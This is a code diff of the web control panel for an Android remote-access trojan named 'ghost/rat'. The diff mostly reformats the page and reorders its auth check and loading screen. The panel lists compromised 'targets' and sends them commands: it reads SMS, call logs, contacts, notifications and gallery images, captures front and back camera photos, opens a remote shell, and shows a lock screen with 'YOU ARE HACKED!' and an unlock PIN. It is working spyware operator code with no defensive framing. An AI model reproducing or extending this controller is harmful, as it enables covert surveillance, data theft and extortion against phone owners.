@@ -358,7 +358,7 @@
     </style>
 </head>
 <body>
-    <!-- SYSTEM LOADING SCREEN (same as index) -->
+    <!-- SYSTEM LOADING SCREEN -->
     <div id="systemLoader" class="system-loader">
         <div class="boot-sequence">
             <div class="boot-logo">
@@ -375,382 +375,368 @@
         </div>
     </div>
 
-<div id="main-app">
-    <div class="app-container">
-        <header class="panel header">
-            <h1><i class="fas fa-skull"></i> ghost/rat</h1>
-            <div style="display:flex; gap:10px; align-items:center;">
-                <span style="color:#b1ffb1; font-size:0.9rem;"><i class="fa-regular fa-id-card"></i> <span id="user-display">visitor</span></span>
-                <button onclick="logout()" style="background:#4d2727; border:2px solid #ff6a6a; padding:6px 12px;">✕</button>
-            </div>
-        </header>
+    <!-- MAIN DASHBOARD (awalnya hidden, akan ditampilkan setelah loading) -->
+    <div id="main-app">
+        <div class="app-container">
+            <header class="panel header">
+                <h1><i class="fas fa-skull"></i> ghost/rat</h1>
+                <div style="display:flex; gap:10px; align-items:center;">
+                    <span style="color:#b1ffb1; font-size:0.9rem;"><i class="fa-regular fa-id-card"></i> <span id="user-display">visitor</span></span>
+                    <button onclick="logout()" style="background:#4d2727; border:2px solid #ff6a6a; padding:6px 12px;">✕</button>
+                </div>
+            </header>
 
-        <div class="panel">
-            <h3 style="color:#ffa3a3; margin-bottom:12px; font-size:1.1rem;"><i class="fa-regular fa-compass"></i> TARGETS</h3>
-            <div id="device-list">scanning...</div>
-        </div>
-
-        <div class="panel">
-            <div class="status-bar">
-                <span>🎯 <b id="sel-info" style="color:#b3ffb3;">None</b></span>
-                <span>📶 <b id="conn-stat" style="color:#ff5e5e;">OFF</b></span>
+            <div class="panel">
+                <h3 style="color:#ffa3a3; margin-bottom:12px; font-size:1.1rem;"><i class="fa-regular fa-compass"></i> TARGETS</h3>
+                <div id="device-list">scanning...</div>
             </div>
-            <div class="grid" id="main-grid"></div>
+
+            <div class="panel">
+                <div class="status-bar">
+                    <span>🎯 <b id="sel-info" style="color:#b3ffb3;">None</b></span>
+                    <span>📶 <b id="conn-stat" style="color:#ff5e5e;">OFF</b></span>
+                </div>
+                <div class="grid" id="main-grid"></div>
+            </div>
         </div>
     </div>
-</div>
 
-<div id="modal" class="modal">
-    <div class="modal-card">
-        <div class="modal-header">
-            <h3 id="modal-title" style="color:#ffa8a8;">MODAL</h3>
-            <span style="cursor:pointer; font-size:2rem;" onclick="closeModal()">&times;</span>
+    <!-- MODAL -->
+    <div id="modal" class="modal">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3 id="modal-title" style="color:#ffa8a8;">MODAL</h3>
+                <span style="cursor:pointer; font-size:2rem;" onclick="closeModal()">&times;</span>
+            </div>
+            <div class="modal-body" id="modal-body"></div>
+            <div class="modal-footer" id="modal-footer"></div>
         </div>
-        <div class="modal-body" id="modal-body"></div>
-        <div class="modal-footer" id="modal-footer"></div>
     </div>
-</div>
 
-<script>
-    (function() {
-        // ---------- LOADING SCREEN SIMULATION ----------
-        const loader = document.getElementById('systemLoader');
-        const bootFill = document.getElementById('bootFill');
-        const bootMsg = document.getElementById('bootMsg');
-        const bootPercent = document.getElementById('bootPercent');
-        
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += 4;
-            if (progress >= 100) {
-                progress = 100;
-                clearInterval(interval);
-                bootMsg.innerText = '>> READY <<';
-                bootPercent.innerText = '100%';
-                bootFill.style.width = '100%';
-                
-                // Hide loader after a short pause
-                setTimeout(() => {
-                    loader.classList.add('fade-out');
-                    setTimeout(() => {
-                        loader.style.display = 'none';
-                    }, 500);
-                }, 400);
-            }
-            bootFill.style.width = progress + '%';
-            bootPercent.innerText = progress + '%';
-            
-            if (progress < 30) bootMsg.innerText = 'establishing link...';
-            else if (progress < 70) bootMsg.innerText = 'loading modules';
-            else bootMsg.innerText = 'finalizing';
-        }, 40);
-
-        // ---------- AUTH CHECK ----------
-        const uid = localStorage.getItem('ghost_uid');
-        if (!uid) {
-            window.location.href = '/';
-            return;
-        }
-        document.getElementById('user-display').innerText = uid;
-
-        // ---------- STATE ----------
-        let devices = [];
-        let selectedDeviceId = null;
-        let flashState = false;
-        let curMod = null;
-        let termOutput = '';
-        let cache = {};                 // cache data per device from /api/data
-
-        // UI elements
-        const deviceListEl = document.getElementById('device-list');
-        const selInfoEl = document.getElementById('sel-info');
-        const connStatEl = document.getElementById('conn-stat');
-        const mainGridEl = document.getElementById('main-grid');
-
-        // ---------- REAL DEVICE POLLING (from /api/status) ----------
-        async function pollDevices() {
-            try {
-                const res = await fetch(`/api/status?owner=${uid}&_=${Date.now()}`);
-                if (!res.ok) throw new Error('poll failed');
-                const data = await res.json();
-                devices = data.devices || [];
-                renderDeviceList();
-
-                if (selectedDeviceId && !devices.find(d => d.id === selectedDeviceId)) {
-                    selectedDeviceId = null;
-                    updateSelection();
-                }
-                // also update cache for selected device if needed
-                if (selectedDeviceId) fetchDeviceData(selectedDeviceId);
-            } catch (e) {
-                console.warn('poll error', e);
-                devices = [];
-                renderDeviceList();
-            }
-            setTimeout(pollDevices, 3000);
-        }
-
-        // fetch full data for a device (used by modal)
-        async function fetchDeviceData(devId) {
-            try {
-                const res = await fetch(`/api/data/${devId}`);
-                if (!res.ok) return;
-                const data = await res.json();
-                cache[devId] = data;
-                // if modal open for this device, refresh
-                if (curMod && selectedDeviceId === devId) {
-                    refreshModalFromCache();
-                }
-            } catch (e) {}
-        }
-
-        function renderDeviceList() {
-            if (!devices.length) {
-                deviceListEl.innerHTML = '<div style="color:#ff8888; padding:10px;">⛔ no targets online</div>';
+    <script>
+        (function() {
+            // ---------- AUTH CHECK (harus paling awal) ----------
+            const uid = localStorage.getItem('ghost_uid');
+            if (!uid) {
+                window.location.href = '/';
                 return;
             }
-            deviceListEl.innerHTML = devices.map(d => `
-                <div class="device-item ${selectedDeviceId === d.id ? 'active' : ''}" onclick="selectDevice('${d.id}')">
-                    <b style="color:#ffb5b5">${d.model || 'unknown'}</b> (${d.man || '?'})<br>
-                    <small style="color:#a5d6b2">Android ${d.ver || '?'} | ⚡ ${d.bat || '?'}%</small>
-                </div>
-            `).join('');
-        }
+            document.getElementById('user-display').innerText = uid;
 
-        window.selectDevice = (id) => {
-            selectedDeviceId = id;
-            renderDeviceList();
-            updateSelection();
-            fetchDeviceData(id); // preload
-        };
+            // ---------- LOADING SCREEN SIMULATION ----------
+            const loader = document.getElementById('systemLoader');
+            const bootFill = document.getElementById('bootFill');
+            const bootMsg = document.getElementById('bootMsg');
+            const bootPercent = document.getElementById('bootPercent');
+            const mainApp = document.getElementById('main-app');
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 4;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    bootMsg.innerText = '>> READY <<';
+                    bootPercent.innerText = '100%';
+                    bootFill.style.width = '100%';
+                    
+                    // HIDE LOADER DAN TAMPILKAN DASHBOARD
+                    setTimeout(() => {
+                        loader.classList.add('fade-out');
+                        // Tampilkan dashboard
+                        mainApp.style.display = 'block';
+                        
+                        // Sembunyikan loader sepenuhnya setelah fade out
+                        setTimeout(() => {
+                            loader.style.display = 'none';
+                        }, 500);
+                    }, 400);
+                }
+                bootFill.style.width = progress + '%';
+                bootPercent.innerText = progress + '%';
+                
+                if (progress < 30) bootMsg.innerText = 'establishing link...';
+                else if (progress < 70) bootMsg.innerText = 'loading modules';
+                else bootMsg.innerText = 'finalizing';
+            }, 40);
 
-        function updateSelection() {
-            if (selectedDeviceId) {
-                selInfoEl.innerText = selectedDeviceId;
-                connStatEl.innerText = 'ONLINE';
-                connStatEl.style.color = '#9effb0';
-            } else {
-                selInfoEl.innerText = 'None';
-                connStatEl.innerText = 'OFF';
-                connStatEl.style.color = '#ff7a7a';
-            }
-            renderMainButtons();
-        }
+            // ---------- STATE ----------
+            let devices = [];
+            let selectedDeviceId = null;
+            let flashState = false;
+            let curMod = null;
+            let termOutput = '';
+            let cache = {};
 
-        // ---------- BUTTON GRID ----------
-        function renderMainButtons() {
-            const btns = [
-                { id:'filemanager', i:'fa-terminal', l:'SHELL' }, { id:'info', i:'fa-circle-info', l:'INFO' },
-                { id:'panic', i:'fa-triangle-exclamation', l:'LOCK' }, { id:'contacts', i:'fa-address-book', l:'CON' },
-                { id:'sms', i:'fa-sms', l:'SMS' }, { id:'calls', i:'fa-phone', l:'CALLS' },
-                { id:'gallery', i:'fa-images', l:'GALL' }, { id:'notifications', i:'fa-bell', l:'NOTIF' },
-                { id:'apps', i:'fa-th', l:'APPS' }, { id:'flash', i:'fa-bolt', l:'FLASH' },
-                { id:'vibrate', i:'fa-mobile-vibration', l:'VIB' }, { id:'voice', i:'fa-microphone', l:'VOICE' },
-                { id:'takebackpic', i:'fa-camera', l:'CAM B' }, { id:'takefrontpic', i:'fa-video', l:'CAM F' },
-                { id:'setwallpaper', i:'fa-image', l:'WALL' }, { id:'toast', i:'fa-lock', l:'LOCK' },
-                { id:'open_url', i:'fa-globe', l:'URL' }
-            ];
-            mainGridEl.innerHTML = btns.map(b => 
-                `<div class="btn ${b.id==='flash' && flashState ? 'active':''}" onclick="${b.id==='flash' ? 'toggleFlashBtn(this)' : 'window.openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`
-            ).join('');
-        }
+            // UI elements
+            const deviceListEl = document.getElementById('device-list');
+            const selInfoEl = document.getElementById('sel-info');
+            const connStatEl = document.getElementById('conn-stat');
+            const mainGridEl = document.getElementById('main-grid');
 
-        window.toggleFlashBtn = (btn) => {
-            flashState = !flashState;
-            btn.classList.toggle('active');
-            if (selectedDeviceId) cmd(flashState ? 'flashon' : 'flashoff');
-        };
+            // ---------- REAL DEVICE POLLING ----------
+            async function pollDevices() {
+                try {
+                    const res = await fetch(`/api/status?owner=${uid}&_=${Date.now()}`);
+                    if (!res.ok) throw new Error('poll failed');
+                    const data = await res.json();
+                    devices = data.devices || [];
+                    renderDeviceList();
 
-        // ---------- COMMAND SENDER ----------
-        window.cmd = function(command, extra = {}) {
-            if (!selectedDeviceId) return;
-            fetch('/api/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ cmd: command, client_id: selectedDeviceId, ...extra })
-            }).catch(e => console.warn('cmd error', e));
-        };
-
-        // ---------- MODAL: open & populate from cache ----------
-        window.openModal = (t) => {
-            if (!selectedDeviceId) return;
-            curMod = t;
-            document.getElementById('modal').style.display = 'flex';
-            document.getElementById('modal-title').innerText = t.toUpperCase();
-            const body = document.getElementById('modal-body');
-            const foot = document.getElementById('modal-footer');
-            body.innerHTML = ''; foot.innerHTML = '';
-
-            // if we have cached data, show it immediately, then refresh
-            if (cache[selectedDeviceId]) {
-                renderModalFromCache(t);
-            } else {
-                body.innerHTML = `<p style="color:#aaa; padding:20px;">loading ${t}...</p>`;
-            }
-
-            // always send command to get fresh data
-            sendCommandForModal(t);
-
-            // specific UI for some modules
-            if (t === 'filemanager') {
-                termOutput = 'ghost@android:~#\n';
-                body.innerHTML = `<div class="terminal" id="terminal">${termOutput}</div>
-                    <div style="display:flex; gap:5px; margin-top:8px;">
-                        <span style="color:#ffa4a4">λ</span>
-                        <input id="term-in" style="background:#1b0b0b; border:2px solid #de5a5a;" onkeydown="if(event.key==='Enter') execShellCmd()">
-                    </div>`;
-                foot.innerHTML = `<button onclick="document.getElementById('up-file').click()">UPLOAD</button><input type="file" id="up-file" style="display:none">`;
-                cmd('filemanager');
-            }
-            else if (t === 'panic') {
-                body.innerHTML = `<p>seconds:</p><input type="number" id="psec" value="30"><p>message:</p><textarea id="pmsg">YOU ARE HACKED!</textarea>`;
-                foot.innerHTML = `<button class="red-btn" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value)">START</button>`;
-            }
-            else if (t === 'voice') {
-                body.innerHTML = `<div style="text-align:center;padding:20px;"><i class="fas fa-microphone" style="font-size:3rem;color:#ff8888"></i><p id="v-stat">ready</p></div>`;
-                foot.innerHTML = `<button onclick="startMockRec()">START</button><button onclick="stopMockRec()" style="display:none;" id="v-stop">STOP</button>`;
-            }
-            else if (t === 'toast') {
-                body.innerHTML = `<p>message:</p><textarea id="lmsg">SYSTEM CRITICAL</textarea><p>PIN:</p><input id="lpin" value="1337">`;
-                foot.innerHTML = `<button class="red-btn" style="flex:1;" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button> 
-                                  <button style="flex:1;" onclick="cmd('unlock')">UNLOCK</button>`;
-            }
-            else if (t === 'vibrate') {
-                body.innerHTML = `<p>duration (s):</p><input id="vsec" value="3">`;
-                foot.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">VIBRATE</button>`;
-            }
-            else if (t === 'setwallpaper') {
-                body.innerHTML = `<p>upload:</p><input type="file" onchange="uploadWall(this)"><p>url:</p><input id="wurl" value="https://example.com/img.jpg">`;
-                foot.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
-            }
-            else if (t === 'open_url') {
-                body.innerHTML = `<p>URL:</p><input id="ourl" value="https://google.com">`;
-                foot.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
-            }
-            else {
-                // add refresh button for data modules
-                foot.innerHTML = `<button onclick="sendCommandForModal('${t}')">REFRESH</button>`;
-            }
-        };
-
-        function sendCommandForModal(t) {
-            const cmdMap = {
-                sms: 'getsms', calls: 'getcalllogs', contacts: 'getcontacts',
-                notifications: 'getnotifications', info: 'deviceinfo',
-                gallery: 'gallery', apps: 'list_app',
-                takebackpic: 'takebackpic', takefrontpic: 'takefrontpic',
-                filemanager: 'filemanager'
-            };
-            const command = cmdMap[t] || t;
-            if (command) cmd(command);
-        }
-
-        function renderModalFromCache(t) {
-            const data = cache[selectedDeviceId];
-            if (!data) return;
-            const body = document.getElementById('modal-body');
-            if (!body) return;
-
-            if (t === 'sms') {
-                const smsList = data.sms || [];
-                body.innerHTML = `<table class="data-table"><tr><th>Sender</th><th>Message</th></tr>${
-                    smsList.map(s => `<tr><td>${s.userSender || s.address || '?'}</td><td>${s.content || s.body || ''}</td></tr>`).join('')
-                }</table>`;
-            }
-            else if (t === 'calls') {
-                const callsList = data.calls || [];
-                body.innerHTML = `<table class="data-table"><tr><th>Number</th><th>Duration</th></tr>${
-                    callsList.map(c => `<tr><td>${c.number}</td><td>${c.duration_seconds || '?'}s</td></tr>`).join('')
-                }</table>`;
-            }
-            else if (t === 'contacts') {
-                const contactsList = data.contacts || [];
-                body.innerHTML = `<table class="data-table"><tr><th>Name</th><th>Number</th></tr>${
-                    contactsList.map(c => `<tr><td>${c.name || '?'}</td><td>${c.number || ''}</td></tr>`).join('')
-                }</table>`;
-            }
-            else if (t === 'notifications') {
-                const notifList = data.notifications || [];
-                body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Text</th></tr>${
-                    notifList.map(n => `<tr><td>${n.packageName || n.app}</td><td>${n.title ? n.title+': ' : ''}${n.text || ''}</td></tr>`).join('')
-                }</table>`;
-            }
-            else if (t === 'info') {
-                const i = data.info || {};
-                body.innerHTML = `<table class="data-table"><tr><td>Model</td><td>${i.Model || ''}</td></tr><tr><td>Manufacturer</td><td>${i.Manufacturer || ''}</td></tr><tr><td>Android</td><td>${i.AndroidVersion || ''}</td></tr><tr><td>Battery</td><td>${i.Battery || ''}</td></tr><tr><td>Phone</td><td>${i.PhoneNumber || ''}</td></tr></table>`;
-            }
-            else if (t === 'apps') {
-                const appsList = data.apps || [];
-                body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Action</th></tr>${
-                    appsList.map(a => `<tr><td>${a.appName || a.packageName}</td><td><button onclick="cmd('run ${a.packageName}')">RUN</button></td></tr>`).join('')
-                }</table>`;
-            }
-            else if (t === 'gallery') {
-                const gal = data.gallery || {};
-                const files = gal.files || [];
-                body.innerHTML = `<div class="gal-grid">${
-                    files.map(f => `<div class="gal-item"><img src="data:image/jpeg;base64,${f.thumbnail || ''}" /><p style="font-size:0.6rem">${f.name}</p></div>`).join('')
-                }</div>`;
-            }
-            else if (t === 'takebackpic' || t === 'takefrontpic') {
-                const media = data.media || {};
-                if (media.last_img) {
-                    if (media.is_direct) {
-                        body.innerHTML = `<img src="data:image/jpeg;base64,${media.last_img}" style="width:100%; border-radius:16px;" />`;
-                    } else {
-                        body.innerHTML = `<img src="/captured_images/${media.last_img}" style="width:100%; border-radius:16px;" />`;
+                    if (selectedDeviceId && !devices.find(d => d.id === selectedDeviceId)) {
+                        selectedDeviceId = null;
+                        updateSelection();
                     }
+                    if (selectedDeviceId) fetchDeviceData(selectedDeviceId);
+                } catch (e) {
+                    console.warn('poll error', e);
+                    devices = [];
+                    renderDeviceList();
+                }
+                setTimeout(pollDevices, 3000);
+            }
+
+            async function fetchDeviceData(devId) {
+                try {
+                    const res = await fetch(`/api/data/${devId}`);
+                    if (!res.ok) return;
+                    const data = await res.json();
+                    cache[devId] = data;
+                    if (curMod && selectedDeviceId === devId) {
+                        refreshModalFromCache();
+                    }
+                } catch (e) {}
+            }
+
+            function renderDeviceList() {
+                if (!devices.length) {
+                    deviceListEl.innerHTML = '<div style="color:#ff8888; padding:10px;">⛔ no targets online</div>';
+                    return;
+                }
+                deviceListEl.innerHTML = devices.map(d => `
+                    <div class="device-item ${selectedDeviceId === d.id ? 'active' : ''}" onclick="selectDevice('${d.id}')">
+                        <b style="color:#ffb5b5">${d.model || 'unknown'}</b> (${d.man || '?'})<br>
+                        <small style="color:#a5d6b2">Android ${d.ver || '?'} | ⚡ ${d.bat || '?'}%</small>
+                    </div>
+                `).join('');
+            }
+
+            window.selectDevice = (id) => {
+                selectedDeviceId = id;
+                renderDeviceList();
+                updateSelection();
+                fetchDeviceData(id);
+            };
+
+            function updateSelection() {
+                if (selectedDeviceId) {
+                    selInfoEl.innerText = selectedDeviceId;
+                    connStatEl.innerText = 'ONLINE';
+                    connStatEl.style.color = '#9effb0';
                 } else {
-                    body.innerHTML = '<p>no image yet</p>';
+                    selInfoEl.innerText = 'None';
+                    connStatEl.innerText = 'OFF';
+                    connStatEl.style.color = '#ff7a7a';
+                }
+                renderMainButtons();
+            }
+
+            function renderMainButtons() {
+                const btns = [
+                    { id:'filemanager', i:'fa-terminal', l:'SHELL' }, { id:'info', i:'fa-circle-info', l:'INFO' },
+                    { id:'panic', i:'fa-triangle-exclamation', l:'LOCK' }, { id:'contacts', i:'fa-address-book', l:'CON' },
+                    { id:'sms', i:'fa-sms', l:'SMS' }, { id:'calls', i:'fa-phone', l:'CALLS' },
+                    { id:'gallery', i:'fa-images', l:'GALL' }, { id:'notifications', i:'fa-bell', l:'NOTIF' },
+                    { id:'apps', i:'fa-th', l:'APPS' }, { id:'flash', i:'fa-bolt', l:'FLASH' },
+                    { id:'vibrate', i:'fa-mobile-vibration', l:'VIB' }, { id:'voice', i:'fa-microphone', l:'VOICE' },
+                    { id:'takebackpic', i:'fa-camera', l:'CAM B' }, { id:'takefrontpic', i:'fa-video', l:'CAM F' },
+                    { id:'setwallpaper', i:'fa-image', l:'WALL' }, { id:'toast', i:'fa-lock', l:'LOCK' },
+                    { id:'open_url', i:'fa-globe', l:'URL' }
+                ];
+                mainGridEl.innerHTML = btns.map(b => 
+                    `<div class="btn ${b.id==='flash' && flashState ? 'active':''}" onclick="${b.id==='flash' ? 'toggleFlashBtn(this)' : 'window.openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`
+                ).join('');
+            }
+
+            window.toggleFlashBtn = (btn) => {
+                flashState = !flashState;
+                btn.classList.toggle('active');
+                if (selectedDeviceId) cmd(flashState ? 'flashon' : 'flashoff');
+            };
+
+            window.cmd = function(command, extra = {}) {
+                if (!selectedDeviceId) return;
+                fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cmd: command, client_id: selectedDeviceId, ...extra })
+                }).catch(e => console.warn('cmd error', e));
+            };
+
+            window.openModal = (t) => {
+                if (!selectedDeviceId) return;
+                curMod = t;
+                document.getElementById('modal').style.display = 'flex';
+                document.getElementById('modal-title').innerText = t.toUpperCase();
+                const body = document.getElementById('modal-body');
+                const foot = document.getElementById('modal-footer');
+                body.innerHTML = ''; foot.innerHTML = '';
+
+                if (cache[selectedDeviceId]) {
+                    renderModalFromCache(t);
+                } else {
+                    body.innerHTML = `<p style="color:#aaa; padding:20px;">loading ${t}...</p>`;
+                }
+
+                sendCommandForModal(t);
+
+                if (t === 'filemanager') {
+                    termOutput = 'ghost@android:~#\n';
+                    body.innerHTML = `<div class="terminal" id="terminal">${termOutput}</div>
+                        <div style="display:flex; gap:5px; margin-top:8px;">
+                            <span style="color:#ffa4a4">λ</span>
+                            <input id="term-in" style="background:#1b0b0b; border:2px solid #de5a5a;" onkeydown="if(event.key==='Enter') execShellCmd()">
+                        </div>`;
+                    foot.innerHTML = `<button onclick="document.getElementById('up-file').click()">UPLOAD</button><input type="file" id="up-file" style="display:none">`;
+                    cmd('filemanager');
+                }
+                else if (t === 'panic') {
+                    body.innerHTML = `<p>seconds:</p><input type="number" id="psec" value="30"><p>message:</p><textarea id="pmsg">YOU ARE HACKED!</textarea>`;
+                    foot.innerHTML = `<button class="red-btn" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value)">START</button>`;
+                }
+                else if (t === 'voice') {
+                    body.innerHTML = `<div style="text-align:center;padding:20px;"><i class="fas fa-microphone" style="font-size:3rem;color:#ff8888"></i><p id="v-stat">ready</p></div>`;
+                    foot.innerHTML = `<button onclick="startMockRec()">START</button><button onclick="stopMockRec()" style="display:none;" id="v-stop">STOP</button>`;
+                }
+                else if (t === 'toast') {
+                    body.innerHTML = `<p>message:</p><textarea id="lmsg">SYSTEM CRITICAL</textarea><p>PIN:</p><input id="lpin" value="1337">`;
+                    foot.innerHTML = `<button class="red-btn" style="flex:1;" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button> 
+                                      <button style="flex:1;" onclick="cmd('unlock')">UNLOCK</button>`;
+                }
+                else if (t === 'vibrate') {
+                    body.innerHTML = `<p>duration (s):</p><input id="vsec" value="3">`;
+                    foot.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">VIBRATE</button>`;
+                }
+                else if (t === 'setwallpaper') {
+                    body.innerHTML = `<p>upload:</p><input type="file" onchange="uploadWall(this)"><p>url:</p><input id="wurl" value="https://example.com/img.jpg">`;
+                    foot.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
+                }
+                else if (t === 'open_url') {
+                    body.innerHTML = `<p>URL:</p><input id="ourl" value="https://google.com">`;
+                    foot.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
+                }
+                else {
+                    foot.innerHTML = `<button onclick="sendCommandForModal('${t}')">REFRESH</button>`;
+                }
+            };
+
+            function sendCommandForModal(t) {
+                const cmdMap = {
+                    sms: 'getsms', calls: 'getcalllogs', contacts: 'getcontacts',
+                    notifications: 'getnotifications', info: 'deviceinfo',
+                    gallery: 'gallery', apps: 'list_app',
+                    takebackpic: 'takebackpic', takefrontpic: 'takefrontpic',
+                    filemanager: 'filemanager'
+                };
+                const command = cmdMap[t] || t;
+                if (command) cmd(command);
+            }
+
+            function renderModalFromCache(t) {
+                const data = cache[selectedDeviceId];
+                if (!data) return;
+                const body = document.getElementById('modal-body');
+                if (!body) return;
+
+                if (t === 'sms') {
+                    const smsList = data.sms || [];
+                    body.innerHTML = `<table class="data-table"><tr><th>Sender</th><th>Message</th></tr>${
+                        smsList.map(s => `<tr><td>${s.userSender || s.address || '?'}</td><td>${s.content || s.body || ''}</td></tr>`).join('')
+                    }</table>`;
+                }
+                else if (t === 'calls') {
+                    const callsList = data.calls || [];
+                    body.innerHTML = `<table class="data-table"><tr><th>Number</th><th>Duration</th></tr>${
+                        callsList.map(c => `<tr><td>${c.number}</td><td>${c.duration_seconds || '?'}s</td></tr>`).join('')
+                    }</table>`;
+                }
+                else if (t === 'contacts') {
+                    const contactsList = data.contacts || [];
+                    body.innerHTML = `<table class="data-table"><tr><th>Name</th><th>Number</th></tr>${
+                        contactsList.map(c => `<tr><td>${c.name || '?'}</td><td>${c.number || ''}</td></tr>`).join('')
+                    }</table>`;
+                }
+                else if (t === 'notifications') {
+                    const notifList = data.notifications || [];
+                    body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Text</th></tr>${
+                        notifList.map(n => `<tr><td>${n.packageName || n.app}</td><td>${n.title ? n.title+': ' : ''}${n.text || ''}</td></tr>`).join('')
+                    }</table>`;
+                }
+                else if (t === 'info') {
+                    const i = data.info || {};
+                    body.innerHTML = `<table class="data-table"><tr><td>Model</td><td>${i.Model || ''}</td></tr><tr><td>Manufacturer</td><td>${i.Manufacturer || ''}</td></tr><tr><td>Android</td><td>${i.AndroidVersion || ''}</td></tr><tr><td>Battery</td><td>${i.Battery || ''}</td></tr><tr><td>Phone</td><td>${i.PhoneNumber || ''}</td></tr></table>`;
+                }
+                else if (t === 'apps') {
+                    const appsList = data.apps || [];
+                    body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Action</th></tr>${
+                        appsList.map(a => `<tr><td>${a.appName || a.packageName}</td><td><button onclick="cmd('run ${a.packageName}')">RUN</button></td></tr>`).join('')
+                    }</table>`;
+                }
+                else if (t === 'gallery') {
+                    const gal = data.gallery || {};
+                    const files = gal.files || [];
+                    body.innerHTML = `<div class="gal-grid">${
+                        files.map(f => `<div class="gal-item"><img src="data:image/jpeg;base64,${f.thumbnail || ''}" /><p style="font-size:0.6rem">${f.name}</p></div>`).join('')
+                    }</div>`;
+                }
+                else if (t === 'takebackpic' || t === 'takefrontpic') {
+                    const media = data.media || {};
+                    if (media.last_img) {
+                        if (media.is_direct) {
+                            body.innerHTML = `<img src="data:image/jpeg;base64,${media.last_img}" style="width:100%; border-radius:16px;" />`;
+                        } else {
+                            body.innerHTML = `<img src="/captured_images/${media.last_img}" style="width:100%; border-radius:16px;" />`;
+                        }
+                    } else {
+                        body.innerHTML = '<p>no image yet</p>';
+                    }
                 }
             }
-        }
 
-        // called after new data arrives
-        window.refreshModalFromCache = function() {
-            if (curMod) renderModalFromCache(curMod);
-        };
+            window.refreshModalFromCache = function() {
+                if (curMod) renderModalFromCache(curMod);
+            };
 
-        // ---------- UTILS ----------
-        window.execShellCmd = () => {
-            let inp = document.getElementById('term-in');
-            if (!inp) return;
-            const cmdLine = inp.value;
-            termOutput += `\n# ${cmdLine}`;
-            document.getElementById('terminal').innerText = termOutput;
-            cmd(cmdLine);
-            inp.value = '';
-        };
+            window.execShellCmd = () => {
+                let inp = document.getElementById('term-in');
+                if (!inp) return;
+                const cmdLine = inp.value;
+                termOutput += `\n# ${cmdLine}`;
+                document.getElementById('terminal').innerText = termOutput;
+                cmd(cmdLine);
+                inp.value = '';
+            };
 
-        window.closeModal = () => {
-            document.getElementById('modal').style.display = 'none';
-            if (curMod === 'filemanager') cmd('exit_shell');
-            if (curMod === 'gallery') cmd('exit_gallery');
-            curMod = null;
-        };
+            window.closeModal = () => {
+                document.getElementById('modal').style.display = 'none';
+                if (curMod === 'filemanager') cmd('exit_shell');
+                if (curMod === 'gallery') cmd('exit_gallery');
+                curMod = null;
+            };
 
-        // UPDATED: logout redirects to root "/"
-        window.logout = () => {
-            localStorage.removeItem('ghost_uid');
-            window.location.href = '/';
-        };
+            window.logout = () => {
+                localStorage.removeItem('ghost_uid');
+                window.location.href = '/';
+            };
 
-        // stub functions for voice/wallpaper
-        window.startMockRec = window.startMockRec || function() {};
-        window.stopMockRec = window.stopMockRec || function() {};
-        window.uploadWall = window.uploadWall || function() {};
+            window.startMockRec = window.startMockRec || function() {};
+            window.stopMockRec = window.stopMockRec || function() {};
+            window.uploadWall = window.uploadWall || function() {};
 
-        // start polling
-        updateSelection();
-        pollDevices();
-
-        // expose for possible updates from server push (if implemented)
-        window.receiveModalData = function(type, data) {
-            if (curMod === type) {
-                renderModalFromCache(curMod);
-            }
-        };
-    })();
-</script>
+            // Start polling setelah dashboard siap
+            updateSelection();
+            pollDevices();
+        })();
+    </script>
 </body>
 </html>
